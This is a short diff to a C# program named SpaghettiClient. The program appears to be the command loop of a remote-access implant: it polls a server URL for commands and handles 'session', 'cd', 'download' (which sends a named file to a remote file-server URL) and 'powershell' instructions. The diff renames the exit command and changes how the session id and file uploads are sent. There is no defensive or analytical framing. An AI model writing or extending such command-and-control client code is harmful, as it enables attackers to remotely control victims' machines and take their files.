@@ -21,7 +21,7 @@ namespace SpaghettiClient
             {
                 String cmd = Utilities.Get(url, location);
 
-                if (cmd.ToLower() == "terminate")
+                if (cmd.ToLower() == "exit")
                 {
                     break;
                 }
@@ -31,7 +31,7 @@ namespace SpaghettiClient
                 }
                 else if (cmd.ToLower() == "session")
                 {
-                    Utilities.Post(url, sessionid);
+                    Utilities.Post(url, "!#!"+sessionid);
                 }
                 else if (cmd.ToLower().StartsWith("cd ")) 
                 {
@@ -40,7 +40,7 @@ namespace SpaghettiClient
                 else if (cmd.ToLower().StartsWith("download "))
                 {
                     string filename = cmd.Substring(9).Replace("\"","");
-                    Utilities.Put(fs_url, filename, location, sessionid);
+                    Utilities.Put(fs_url, url, filename, location, sessionid);
                 }
                 else if (cmd.ToLower().StartsWith("powershell "))
                 {
